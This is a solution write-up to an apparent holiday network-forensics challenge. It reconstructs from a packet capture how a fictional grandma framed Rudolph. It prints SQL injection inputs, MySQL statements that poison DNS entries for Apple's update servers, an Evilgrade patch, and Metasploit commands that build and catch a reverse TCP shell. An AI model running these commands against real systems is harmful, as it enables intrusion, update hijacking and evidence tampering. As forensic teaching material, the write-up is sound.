@@ -1,0 +1,535 @@
+By: Ron Bowes
+With help from Alex Weber
+
+Done in the name of SkullSpace Winnipeg, Winnipeg's first and only hackerspace! 
+
+--------------------------------------------------------------------------------
+QUESTION 1: According to the packet capture file, what was Grandma's grand plan
+for Christmas day?
+--------------------------------------------------------------------------------
+
+  There are three pieces of evidence here.
+
+  ------
+  QUESTION 1 - PART 1 - THE EMAIL BODY
+  ------
+    The email itself. At Dec 25, 2011 06:51:12.965630000, an SMTP session was
+    opened to a mailserver - 192.168.1.3 - with the following message:
+      ----------------------------------------
+      Date: Sun, 25 Dec 2011 07:42:26 -0500 (EST)
+      From: Grandma <root@grandma.gma>
+      X-X-Sender: root@bt
+      To: cousinmel@mail.gma
+      Subject: Christmas
+      Message-ID: <alpine.DEB.2.02.1112250741440.7396@bt>
+      User-Agent: Alpine 2.02 (DEB 1266 2009-07-14)
+      MIME-Version: 1.0
+      Content-Type: MULTIPART/MIXED; BOUNDARY="0-471592043-1324816946=:7396"
+
+        This message is in MIME format.  The first part should be readable text,
+        while the remaining parts are likely unreadable without MIME-aware
+        tools.
+
+      --0-471592043-1324816946=:7396
+      Content-Type: TEXT/PLAIN; format=flowed; charset=ISO-8859-7
+      Content-Transfer-Encoding: 8BIT
+
+      Dear Mel,
+
+      Our plans are almost complete, and I am very excited.  Soon, you and I
+      shall be spending the rest of our days relaxing in the surf and sun!
+
+      The plan is highly sensitive, a deep secret that only the two of us share.
+      Never tell another soul about our clever scheme as long as you live.
+
+      As we discussed, I recently made you the sole beneficiary of my life
+      insurance policy.  On Christmas Eve, I plan on faking my own death, which
+      I will frame as murder on Rudolph, Santa.s obnoxious reindeer.
+
+      The details of my plan are included in the attached document below.  Read
+      it carefully.
+
+      Merry Christmas!
+      ----------------------------------------
+    This message was followed by an attachment.
+
+  ------
+  QUESTION 1 - PART 2 - WORD DOCUMENT
+  ------
+    The attachment on the email is a Microsoft Word document, as
+    evidenced by the filename and content-type headers:
+      ----------------------------------------
+      Content-Type: APPLICATION/msword; name=LetterToMel.doc
+      Content-Transfer-Encoding: BASE64
+      Content-ID: <alpine.DEB.2.02.1112250742260.7396@bt>
+      Content-Description:
+      Content-Disposition: attachment; filename=LetterToMel.doc
+      ----------------------------------------
+
+    To decode this, the way I like to do it is:
+    1.  Open the xmas2011.pcap file in Wireshark.
+    2.  Scroll down to packet #60 (sent Dec 25, 2011 06:51:13.272933000), which
+        is the reconstructed SMTP data packet.
+    3.  In Wireshark's treeview (the middle pane), right-click on 'Internet
+        Message Format' and select 'Export selected packet bytes'.
+    4.  Type a filename, such as grandma-email.txt.
+    5.  Open the filename in your favourite editor, and delete everything that
+        isn't base64-encoded. That is, everything before this line:
+          0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAAB
+        and everything after this line:
+          AAAAAAAAAAAAAAAAAAAAAA==
+        then save and close.
+    6.  Run the following command:
+        $ base64 --ignore-garbage -d grandma-email.txt > grandma-email.doc
+
+    The document is now ready to be opened in the viewer of your choice (such
+    as LibreOffice). Be careful though! Grandma is a tricksy sort and there
+    are countless file-format bugs diclosed in office applications every month.
+
+    The document reads:
+      ----------------------------------------
+      Dear Mel,
+
+      Here are the details of my secret plan.
+
+      After the investigation turns up the evidence I plant, you provide
+      eyewitness testimony in court, and Rudolph is convicted, you will receive
+      the insurance payout.  We can then use that money to fund our Caribbean
+      retirement.
+
+      I am not sure I ever told you this, Mel, but as a child, my village was
+      attacked by a ravenous band of rampaging reindeer, instilling a life-long
+      hatred in me for the flea-bitten beasts.  I’ll never forget their
+      horrible comments as they galloped through our village.  Because of that
+      chilling childhood experience, I’m going to fake my death and blame it
+      all on Rudolph, the most well-known reindeer of all.  He’ll rot away in
+      jail forever.
+
+      Merry Christmas,
+
+      Grandma
+      ----------------------------------------
+
+  ------
+  QUESTION 1 - PART 3 - METADATA
+  ------
+    Because this is an Ed Skoudis challenge, we immediately checked the
+    document's meta-data. Sure enough, there was a secret comment. This can be
+    done using your favourite office program by selecting File->Properties.
+    However, a proper hacker would naturally use exiftool:
+      ----------------------------------------
+      $ exiftool grandma-email.doc
+      [...]
+      Comments                        : I will hide out at the Plaza Hotel near
+      Central Park for several weeks, and meet you there in the lobby exactly
+      one week after the trial concludes with a guilty verdict for Rudolph,
+      precisely at noon local time.  Make sure you bring the money in a
+      suitcase full of cash.  I’ll be wearing one red shoe.
+      [...]
+      ----------------------------------------
+
+    This will be applicable in QUESTION 3.
+
+  ------
+  QUESTION 1 - PART 4 - MISCELLANEOUS
+  ------
+  Other information we can gather from mail headers:
+  - Grandma has the IP address 192.168.1.10.
+  - Grandma has a mailserver at 192.168.1.3, called mail.gma.
+  - Grandma's email address is root@grandma.gma.
+  - Grandma is running Backtrack 5 and using Alpine 2.02 to send her email.
+
+  ------
+  QUESTION 1 - PART 5 - SUMMARY
+  ------
+  Grandma's plan was to make Cousin Mel the beneficiary of her life insurance
+  policy, fake her own death, frame Rudolph, and to fly to the Caribbean with
+  Cousin Mel and a suitcase full of money.
+
+  Because she's telling him to bring cash, it's reasonable to conclude that she
+  plans to murder Cousin Mel and take the money for herself. If you search
+  Grandma's hotel room, I'm certain you'll find a single one-way ticket to
+  the Carribean and a single phony passport.
+
+--------------------------------------------------------------------------------
+QUESTION 2: Why did the geo-location information on Rudolph's computer, synced
+from his cell phone, show that Rudolph was in Central Park during the attack?
+Please describe each technical step that lead to this "evidence" presented in
+court.
+--------------------------------------------------------------------------------
+  The answer to this question is quite complex, so I'll divide it into a few
+  smaller parts.
+  ------
+  QUESTION 2 - PART 1 - SQL INJECTION
+  ------
+    Starting in Packet 71, sent at Dec 25, 2011 06:51:51.384946000, Grandma
+    (from 192.168.1.10) connects to Santa's Web server (172.19.79.2) on port
+    80. The obvious questions are a) why does Grandma have access to Santa's
+    private IP space, and b) why isn't Santa using SSL? Presumably, Grandma
+    gained access to the VPN through a social engineering attack. And Santa
+    just doesn't believe in encryption?
+
+    In any case, Grandma looks up herself and Cousin Mel in Santa's application.
+    It appears that they have both been naughty. I'd rather not know what being
+    a naughty grandma entails...
+
+    In the session starting at packet 125, sent at Dec 25, 2011
+    06:52:21.145359000, Grandma sends a single quote to the application:
+      name=%27
+
+    This triggers an SQL error with the following output from the webserver:
+      ----------------------------------------
+      <table border="3">
+      <tr><th>Name</th><th>Status</th></tr>
+      You have an error in your SQL syntax; check the manual that corresponds
+      to your MySQL server version for the right syntax to use near ''''' at
+      line 1</table>
+      </body></html>
+      ----------------------------------------
+
+    Uh oh!
+
+    Grandma then starts to perform SQL queries. I reconstructed the MySQL
+    sessions below.
+
+  ------
+  QUESTION 2 - PART 2 - DNS POISONING
+  ------
+    First, Grandma verifies she has SQL access:
+      ----------------------------------------
+      mysql> '
+      You have an error in your SQL syntax; check the manual that corresponds
+      to your MySQL server version for the right syntax to use near ''''' at
+      line 1
+      ----------------------------------------
+
+    Then she gets a list of databases:
+      ----------------------------------------
+      mysql> show databases #
+      information_schema
+      mydns
+      mysql
+      naughtylist
+      ----------------------------------------
+    Lucky her! 'mysql' and 'information_schema' are built-in, 'naughtylist' is
+    clearly the application that she's attacking, but 'mydns' is interesting.
+
+    I looked up MyDNS (http://mydns.bboy.net/), and it turns out that it's a
+    MySQL-based DNS server. So, this gives Grandma access to modify DNS records
+    on the Web server and, presumably, Santa's entire network.
+
+    Next, she takes a closer look at the tables in the 'mydns' database:
+      ----------------------------------------
+      mysql> show tables from mydns #
+      rr
+      soa
+
+      mysql> show columns from mydns.rr #
+      id  int(10) unsigned  NO  PRI   auto_increment
+      zone  int(10) unsigned  NO  MUL
+      name  char(64)  NO
+      type  enum('A','AAAA','ALIAS','CNAME','HINFO','MX','NAPTR','NS','PTR',
+      'RP','SRV','TXT') YES
+      data  char(128) NO
+      aux int(10) unsigned  NO
+      ttl int(10) unsigned  NO    86400
+
+      mysql> show columns from mydns.soa #
+      id  int(10) unsigned  NO  PRI   auto_increment
+      origin  char(255) NO  UNI
+      ns  char(255) NO
+      mbox  char(255) NO
+      serial  int(10) unsigned  NO    1
+      refresh int(10) unsigned  NO    28800
+      retry int(10) unsigned  NO    7200
+      expire  int(10) unsigned  NO    604800
+      minimum int(10) unsigned  NO    86400
+      ttl int(10) unsigned  NO    86400
+
+      mysql> select * from mydns.soa #
+      1 santaslist.northpole  ns1.santaslist.northpole  root.santaslist.northpo
+      le 25  28800 7200  604800  86400 86400
+      ----------------------------------------
+    From this, Grandma learns that the MyDNS server has two tables - rr
+    (resource record) and soa (start of authority). Looking at the soa table,
+    Grandma discovers that the server lists the authority for
+    santaslist.northpole as ns1.santaslist.northpole, which is presumably
+    itself.
+
+    Grandma then inserts her own authoritative server and checks to make sure
+    the insert worked as expected.
+      ----------------------------------------
+      mysql> insert into mydns.soa (origin,ns,mbox) values ("apple.com","ns1.sa
+      ntaslist.northpole","root.santaslist.northpole") #
+
+      mysql> select * from mydns.soa #
+      1 santaslist.northpole  ns1.santaslist.northpole  root.santaslist.northpo
+      le 25  28800 7200  604800  86400 86400
+      2 apple.com ns1.santaslist.northpole  root.santaslist.northpole 1 28800 7
+      200  604800  86400 86400
+      ----------------------------------------
+    The server will now consider itself the authoritative nameserver for
+    apple.com in addition to santaslist.northpole.
+
+    At this point, if somebody performs a DNS lookup against that server for
+    apple.com, it would return a NXDOMAIN (not found) record.
+
+    Grandma now starts adding resource records for various apple.com services:
+      ----------------------------------------
+      mysql> select * from mydns.rr #
+      1 1 @ NS  ns1.santaslist.northpole  0 86400
+      2 1 ns1.santaslist.northpole  A 172.19.79.2 0 86400
+      3 1 www.santaslist.northpole  A 172.19.79.2 0 86400
+
+      mysql> insert into mydns.rr (zone,name,type,data) values (2,"itunes.apple
+      .com","A","192.168.1.10") #
+
+      mysql> insert into mydns.rr (zone,name,type,data) values (2,"ax.init.itun
+      es.apple.com","A","192.168.1.10") #
+
+      mysql> insert into mydns.rr (zone,name,type,data) values (2,"swcatalog.ap
+      ple.com","A","192.168.1.10") #
+
+      mysql> insert into mydns.rr (zone,name,type,data) values (2,"swcdn.apple.
+      com","A","192.168.1.10") #
+
+      mysql> insert into mydns.rr (zone,name,type,data) values (2,"swscan.apple
+      .com","A","192.168.1.10") #
+
+      mysql> select * from mydns.rr #
+      1 1 @ NS  ns1.santaslist.northpole  0 86400
+      2 1 ns1.santaslist.northpole  A 172.19.79.2 0 86400
+      3 1 www.santaslist.northpole  A 172.19.79.2 0 86400
+      4 2 itunes.apple.com  A 192.168.1.10  0 86400
+      5 2 ax.init.itunes.apple.com  A 192.168.1.10  0 86400
+      6 2 swcatalog.apple.com A 192.168.1.10  0 86400
+      7 2 swcdn.apple.com A 192.168.1.10  0 86400
+      8 2 swscan.apple.com  A 192.168.1.10  0 86400
+      ----------------------------------------
+    The DNS server now knows about itunes.apple.com, ax.init.itunes.apple.com,
+    swcatalog.apple.com, swcdn.apple.com, and swscan.apple.com; and all of them
+    point to Grandma's IP address.
+
+  ------
+  QUESTION 2 - PART 3 - EVILGRADE / METASPLOIT
+  ------
+    Grandma finishes all her work at Dec 25, 2011 06:55:12.298034000. Then, at
+    Dec 25, 2011 06:57:08.506230000, a new IP shows up - 172.19.79.6. This IP,
+    as we'll see, belongs to Rudolph, who has impeccable timing. It appears
+    that Rudolph has just fired up iTunes. The reason I don't believe this is
+    iTunes' automatic update feature is because:
+    a) In the session starting at packet 291, bag.xml is requested. This
+       happens when iTunes starts, not during an automatic update.
+    b) The attack, as we'll see later, requires some user intervention.
+
+    Based on the timing and the fact that this is manual, I believe that
+    Rudolph fell for social engineering. Grandma likely called him, probably
+    under the guise of Apple, to notify him that an update was available. That
+    also explains how Grandma knew exactly which DNS records to poison.
+
+    I was originally working a theory where Grandma bought Rudolph an iPod
+    for Christmas, and when he installed iTunes to use it he was attacked, but
+    that doesn't appear to be what happened. When iTunes is newly installed,
+    the version request has the  &new=1 parameter included.. Rudolph's didn't,
+    therefore iTunes was already installed.
+
+    Meanwhile, Grandma was running Evilgrade on her PC. The smart gal that she
+    is, she would have patched Evilgrade to support newer versions of iTunes
+    (such as the version Rudolph is running - 10.3.1) with the following
+    patch:
+      ----------------------------------------
+      Index: modules/itunes.pm
+      ===================================================================
+      --- modules/itunes.pm   (revision 1224)
+      +++ modules/itunes.pm   (working copy)
+      @@ -63,7 +63,7 @@
+                                        'hidden' => 1,
+                                        'dynamic'=>1,
+                                      },
+      -                   'DATA2'  => { 'val' => '\'10.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(1)',
+      +                   'DATA2'  => { 'val' => '\'10.\'.(isrcore::utils::RndNum(1)+3).\'.\'.isrcore::utils::RndNum(1)',
+                                        'hidden' => 1,
+                                        'dynamic' =>1,
+                                      }
+      ----------------------------------------
+    Otherwise, there's a 1/4 chance that the evilgrade server will tell iTunes
+    it's at the latest version already - and no update will be downloaded
+    (this drove me crazy!).
+
+    There's an additional change that Grandma appears to have made, though I
+    don't understand it. Rather than using the default randomized filename,
+    Grandma hardcoded the filename to iTunesSetup.exe. This may be due to
+    different versions of Evilgrade being used, but I can't find anything in
+    the subversion history. The version on Grandma's computer should be
+    analyzed to find this discrepancy.
+
+      ----------------------------------------
+      Index: modules/itunes.pm
+      ===================================================================
+      --- modules/itunes.pm   (revision 1224)
+      +++ modules/itunes.pm   (working copy)
+      @@ -63,7 +63,7 @@
+                                        'hidden' => 1,
+                                        'dynamic'=>1,
+                                      },
+      -                   'DATA2'  => { 'val' => '\'10.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(1)',
+      +                   'DATA2'  => { 'val' => '\'10.\'.(isrcore::utils::RndNum(1)+3).\'.\'.isrcore::utils::RndNum(1)',
+                                        'hidden' => 1,
+                                        'dynamic' =>1,
+                                      }
+      ----------------------------------------
+
+    (A note to the mods: I'd really like to see why this actually happened..?)
+
+    Once those changes were made, Granny had to generate a payload. The
+    evidence strongly suggests she used Metasploit:
+    a) The template for the payload was ApacheBench 2.2.14, which is the same
+       template that Metasploit uses.
+    b) The payload itself was a stager that downloaded and ran a stage
+       immediately after connecting (the code can be seen in 605).
+    c) Generating a payload with the following command is almost identical:
+       ./msfpayload windows/shell/reverse_tcp LPORT=1225 LHOST=192.168.1.10 X
+    d) Running that payload in a controlled environment works with the following
+       metasploit setup:
+       ----------------------------------------
+       $ ./msfconsole
+       ...
+       msf > use multi/handler
+       msf  exploit(handler) > set PAYLOAD windows/shell/reverse_tcp
+       PAYLOAD => windows/shell/reverse_tcp
+       msf  exploit(handler) > set LPORT 1225
+       LPORT => 1225
+       msf  exploit(handler) > set LHOST 192.168.1.10
+       LHOST => 192.168.1.10
+       msf  exploit(handler) > exploit
+
+       [*] Started reverse handler on 192.168.1.10:1225
+       [*] Starting the payload handler...
+       ----------------------------------------
+
+    She would have put that payload in evilgrade/agent/agent.exe (or she could
+    have configured evilgrade to point to that agent).
+
+    Then, finally, Grandma fired up Evilgrade. She may have disabled the DNS
+    server, various modules, etc., but in the end she may have simply done it
+    the easiest way possible:
+      ----------------------------------------
+      # ./evilgrade
+      [...]
+      evilgrade> start
+      evilgrade>
+      [18/12/2011:15:25:31] - [WEBSERVER] - Webserver ready. Waiting for
+      connections ...
+
+      evilgrade>
+      ----------------------------------------
+
+    Then Rudolph would have had to do the following to generate the trace as we
+    see it:
+    a) Started up iTunes.
+    b) Manually selected Help->'Check for Updates' (or waited for the
+       auto-update to kick in).
+    c) Click on "Download iTunes".
+    d) When the browser pops up - IE8 - he would have had to click the yellow
+       bar that appears at the top, to allow the download.
+    e) He'd have to hit 'Run' on the download, or double-click the .exe file.
+
+    (If he lets the Apple Updater perform the update, it will fail with a
+    bad signature).
+
+    As soon as he runs the .exe file, it connects back to Grandma's computer on
+    TCP port 1225 with a Metasploit Reverse-TCP payload.
+
+    Because of the manual steps involved, I strongly believe that there was a
+    social engineering aspect to this attack.
+
+  ------
+  QUESTION 2 - PART 4 - MOBILESYNC
+  ------
+  Finally, now that Grandma has access to Rudolph's computer, she uploads
+  sqlite.exe, which will let her edit Rudolph's phone database. This article
+  describes the steps to do that, which matches up very closely to what Grandma
+  did:
+    http://andykn.blogspot.com/2011/04/iphone-tracker.html
+
+  The list of locations in Rudolph's records are:
+    90.000000,    0, 000000 North Pole, Canada
+   -36.848461,  174.763333 Auckland, New Zealand
+   -33.873650,  151.206889 Sydney, Australia
+    35.689489,  139.691706 Tokyo, Japan
+    40.332808,  116.477650 Beijing, China
+    39.904214,  116.407414 Beijing, China
+    55.752505,   37.623168 Moskow, Russia
+    52.523406,   13.411400 Berlin, Germany
+    48.858362,    2.294242 Paris, France
+    51.505624,   -0.075383 London, UK
+   -22.903539,  -43.209587 Rio de Janeiro, Brazil
+    18.467964,  -66.108809 San Juan, Puerto Rico
+     6.423750,  -66.589730 Puerto Carreno, Venezuela
+    40.748245,  -73.985534 New York, USA
+    43.653226,  -79.383184 Toronto, Canada
+    40.440625,  -79.995886 Pittsburgh, USA
+    41.878900,  -87.635840 Chicago, USA
+    39.739094, -104.984898 Denver, USA
+    37.819751, -122.478168 San Francisco, USA
+    61.190009, -149.870694 Anchorage, USA
+    21.307237, -157.858055 Honolulu, USA
+    90.000000,    0.000000 North Pole, Canada
+
+  Grandma added the following coordinates:
+    40.771500,  -73.978833
+
+  Which would be directly in Central Park. The geotag on the crime-scene photo
+  reads (using exiftool):
+    40.771500,  -73.978833
+
+  Exactly the same location. Almost too perfect, but we'll let that one slide...
+  :)
+
+  ------
+  QUESTION 2 - PART 5 - SUMMARY
+  ------
+  The summary of what we've learned here:
+  a) Grandma used SQL Injection to compromise Santa's DNS server.
+  b) Grandma poisoned the DNS records for Apple's updater.
+  c) Grandma patched and ran evilgrade on her PC.
+  d) Rudolph (likely socially engineered by Grandma) ran iTunes and installed
+     the evil update.
+  e) Grandma used the reverse-shell to insert a fake location into Rudolph's
+     phone database.
+
+--------------------------------------------------------------------------------
+QUESTION 3: Where should the authorities look for Grandma?
+--------------------------------------------------------------------------------
+  As discussed in QUESTION 1, Grandma will be hiding out in the Plaza
+  Hotel overlooking Central Park. She'll have one cold foot.
+
+--------------------------------------------------------------------------------
+QUESTION 4: Based on the evidence in the packet capture file, who is guilty in
+this story?
+--------------------------------------------------------------------------------
+  Since this is a murder investigation, and nobody was murdered, nobody is
+  guilty of the crime in question.
+
+  Cousin Mel could be charged a number of crimes:
+  - Filing a False Police Report
+  - Obstruction of Justice
+  - Perjury
+  - Attempted insurance fraud
+
+  Grandma, likewise, could be charged with multiple crimes:
+  - Obstruction of Justice
+  - Attempted insurance fraud
+  - Computer intrusion
+
+  Additionally, if I'm right that Grandma had been planning to kill Cousin Mel
+  (see QUESTION 1), this may be leverage to use against Cousin Mel to testify
+  against Grandma
+  It might not be a crime in and of itself: conspiracy charges require two
+  or more persons to agree to commit a crime in the future.
+  Likewise, in nearly all locations where attempted murder is a recognized
+  crime, simply planning an unlawful killing is not criminal in and of itself. 
+
+  Odds are, though, Grandma won't be invited to the family dinners anymore...
+  Perhaps putting her in a home is the best punishment?
+
